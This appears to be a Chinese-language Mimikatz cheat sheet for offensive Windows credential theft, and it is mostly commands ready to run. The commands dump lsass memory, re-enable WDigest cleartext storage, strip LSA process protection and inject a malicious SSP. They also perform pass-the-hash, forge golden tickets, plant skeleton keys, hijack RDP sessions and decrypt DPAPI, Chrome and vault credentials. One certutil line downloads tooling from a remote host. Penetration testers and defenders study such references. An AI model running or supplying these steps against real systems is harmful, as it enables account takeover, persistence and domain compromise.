# Windows - Mimikatz

## 概述

* [执行命令](#执行命令)
* [提取密码](#提取密码)
* [LSA保护绕过](#lsa-保护绕过)
* [迷你转储](#mini-dump)
* [传递哈希](#pass-the-hash)
* [黄金票据](#golden-ticket)
* [万能钥匙](#skeleton-key)
* [RDP会话接管](#rdp-session-takeover)
* [RDP密码](#rdp-passwords)
* [凭据管理器与DPAPI](#credential-manager--dpapi)
  * [Chrome Cookies和凭据](#chrome-cookies--credential)
  * [任务计划凭据](#task-scheduled-credentials)
  * [保险库](#vault)
* [命令列表](#commands-list)
* [PowerShell版本](#powershell-version)
* [参考资料](#references)

![内存中的数据](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)

## 执行命令

只有一个命令

```powershell
PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

Mimikatz控制台（多个命令）

```powershell
PS C:\temp\mimikatz> .\mimikatz
mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
```

## 提取密码

> 自Win8.1 / 2012R2+起，Microsoft禁用了lsass的明文存储。它通过KB2871997作为注册表项在Win7 / 8 / 2008R2 / 2012上进行了回滚，但明文仍然启用。

```powershell
mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest

# 在Windows Server 2012+中重新启用wdigest
# 在HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest中
# 创建一个DWORD 'UseLogonCredential'，值为1。
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
```

:warning: 生效条件如下：

- Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:
  * 添加需要锁定
  * 移除需要注销
- Win10:
  * 添加需要注销
  * 移除需要注销
- Win2016:
  * 添加需要锁定
  * 移除需要重启

## LSA保护绕过

- LSA作为受保护的进程（RunAsPPL）

  ```powershell
  # 检查LSA是否作为受保护的进程运行，方法是查看变量"RunAsPPL"是否设置为0x1
  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
  
  # 接下来从官方mimikatz仓库上传mimidriver.sys到你的mimikatz.exe所在的文件夹
  # 现在让我们将mimidriver.sys导入系统
  mimikatz # !+
  
  # 现在让我们从lsass.exe进程中删除保护标志
  mimikatz # !processprotect /process:lsass.exe /remove
  
  # 最后运行logonpasswords函数以转储lsass
  mimikatz # privilege::debug    
  mimikatz # token::elevate
  mimikatz # sekurlsa::logonpasswords
  
  # 现在让我们重新添加lsass.exe进程的保护标志
  mimikatz # !processprotect /process:lsass.exe
  
  # 卸载创建的服务
  mimikatz # !-
  ```

  # https://github.com/itm4n/PPLdump

  PPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>
  PPLdump.exe lsass.exe lsass.dmp
  PPLdump.exe -v 720 out.dmp

  ```
- LSA作为由**Credential Guard**运行的虚拟化进程(LSAISO)
  ```powershell
  # 检查是否有名为lsaiso.exe的进程在运行
  tasklist |findstr lsaiso
  
  # 让我们将自己的恶意安全支持提供者注入到内存中
  # 需要在同一文件夹中有mimilib.dll
  mimikatz # misc::memssp
  
  # 现在，这台机器上的每个用户会话和身份验证都会被记录，纯文本凭据将被捕获并转储到c:\windows\system32\mimilsa.log中
  ```

## 迷你转储

使用`procdump`转储lsass进程

> 当对lsass进行内存转储时，Windows Defender会被触发，迅速导致转储文件被删除。使用lsass的进程标识符（pid）"绕过"该限制。

```powershell
# HTTP方法 - 使用默认方式
certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# SMB方法 - 使用pid
net use Z: https://live.sysinternals.com
tasklist /fi "imagename eq lsass.exe" # 查找lsass的pid
Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
```

使用`rundll32`转储lsass进程

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
```

使用迷你转储：

* Mimikatz: `.\mimikatz.exe "sekurlsa::minidump lsass.dmp"`

  ```powershell
  mimikatz # sekurlsa::minidump lsass.dmp
  mimikatz # sekurlsa::logonPasswords
  ```

* Pypykatz: `pypykatz lsa minidump lsass.dmp`

## 传递哈希

```powershell
mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
```

## 金票

```powershell
.\mimikatz kerberos::golden /admin:管理员账户名 /domain:域名全名 /id:账户RID /sid:域SID /krbtgt:KRBTGT密码哈希 /ptt
```

```powershell
.\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```

## 骨架密钥

```powershell
privilege::debug
misc::skeleton
# 映射共享
net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
# 以某人身份登录
rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
```

## RDP会话接管

使用`ts::multirdp`来修补RDP服务，以允许多于两个用户。

* 启用权限

  ```powershell
  privilege::debug 
  token::elevate 
  ```

* 列出RDP会话

  ```powershell
  ts::sessions
  ```

* 劫持会话

  ```powershell
  ts::remote /id:2 
  ```

以SYSTEM用户身份运行`tscon.exe`，可以无需密码连接到任何会话。

```powershell
# 获取你想要劫持的会话ID
query user
create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
net start sesshijack
```

## RDP密码

验证服务是否运行：

```ps1
sc queryex termservice
tasklist /M:rdpcorets.dll
netstat -nob | Select-String TermService -Context 1
```

* 手动提取密码

  ```ps1
  procdump64.exe -ma 988 -accepteula C:\svchost.dmp
  strings -el svchost* | grep Password123 -C3
  ```

* 使用Mimikatz提取密码

  ```ps1
  privilege::debug
  ts::logonpasswords
  ```

## 凭据管理器与DPAPI

```powershell
# 检查文件夹以找到凭据
dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*

# 使用mimikatz检查文件
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0

# 查找主密钥
$ mimikatz !sekurlsa::dpapi

# 使用主密钥
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```

### Chrome Cookies和凭据

```powershell
# 保存的Cookies
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b

# Chrome中保存的凭据
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

### 计划任务的凭据

```powershell
mimikatz(命令行) # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / <NULL>
UserName   : DOMAIN\user
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Attributes : 0
```

### 保险箱

```powershell
vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
```

## 命令列表

|            命令             | 定义                                                         |
| :-------------------------: | :----------------------------------------------------------- |
|    CRYPTO::Certificates     | 列出/导出证书                                                |
|    CRYPTO::Certificates     | 列出/导出证书                                                |
|      KERBEROS::Golden       | 创建金票/银票/信任票                                         |
|       KERBEROS::List        | 列出用户内存中的所有用户票据（TGT和TGS）。由于仅显示当前用户的票据，因此不需要特殊权限。类似于“klist”的功能。 |
|        KERBEROS::PTT        | 传递票据。通常用于注入被盗或伪造的Kerberos票据（金票/银票/信任票）。 |
|       LSADUMP::DCSync       | 请求DC同步对象（获取帐户的密码数据）。无需在DC上运行代码。   |
|        LSADUMP::LSA         | 请求LSA服务器检索SAM/AD企业（正常，即时修补或注入）。用于从域控制器或lsass.dmp转储文件中转储所有Active Directory域凭据。也用于获取特定帐户凭据，例如使用参数/name: “/name:krbtgt”获取krbtgt。 |
|        LSADUMP::SAM         | 获取SysKey以解密SAM条目（来自注册表或配置单元）。SAM选项连接到本地安全帐户管理器（SAM）数据库并转储本地帐户的凭据。这用于在Windows计算机上转储所有本地凭据。 |
|       LSADUMP::Trust        | 请求LSA服务器检索信任授权信息（正常或即时修补）。转储所有关联信任（域/森林）的信任密钥（密码）。 |
|        MISC::AddSid         | 将SIDHistory添加到用户帐户。第一个值是目标帐户，第二个值是帐户/组名称（或SID）。已于2016年5月6日移至SID:modify。 |
|        MISC::MemSSP         | 注入恶意Windows SSP以记录本地验证的凭据。                    |
|       MISC::Skeleton        | 将Skeleton Key注入域控制器的LSASS进程。这使得所有用户对Skeleton Key修补的DC的身份验证都能使用“主密码”（又名Skeleton Keys）以及他们的常规密码。 |
|      PRIVILEGE::Debug       | 获取调试权限（此权限或本地系统权限是许多Mimikatz命令所需的）。 |
|       SEKURLSA::Ekeys       | 列出Kerberos加密密钥                                         |
|     SEKURLSA::Kerberos      | 列出所有已验证用户的Kerberos凭据（包括服务和计算机帐户）     |
|      SEKURLSA::Krbtgt       | 获取域Kerberos服务帐户（KRBTGT）密码数据                     |
|  SEKURLSA::LogonPasswords   | 列出所有可用提供者的凭据。这通常显示最近登录的用户和计算机凭据。 |
|        SEKURLSA::Pth        | 传递哈希和过度传递哈希                                       |
|      SEKURLSA::Tickets      | 列出所有最近已验证用户的可用Kerberos票据，包括在用户帐户上下文中运行的服务和本地计算机的AD计算机帐户。与kerberos::list不同，sekurlsa使用内存读取，不受密钥导出限制。sekurlsa可以访问其他会话（用户）的票据。 |
|         TOKEN::List         | 列出系统的所有令牌                                           |
|       TOKEN::Elevate        | 冒充令牌。用于提升权限至SYSTEM（默认）或在盒子上找到域管理员令牌 |
| TOKEN::Elevate /domainadmin | 用域管理员凭据冒充令牌。                                     |

## PowerShell版本

Mimikatz在内存中（磁盘上没有二进制文件）：

- 来自PowerShellEmpire的[Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1)
- 来自PowerSploit的[Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)

可以从内存中获取更多信息的工具：

- [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)

## 参考资料

- [Mimikatz非官方指南与命令参考](https://adsecurity.org/?page_id=1821)
- [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
- [反转Windows Server 2012 R2和Windows Server 2016中的Wdigest配置 - 2017年12月5日 - ACOUCH](https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/)
- [转储RDP凭据 - 2021年5月24日](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)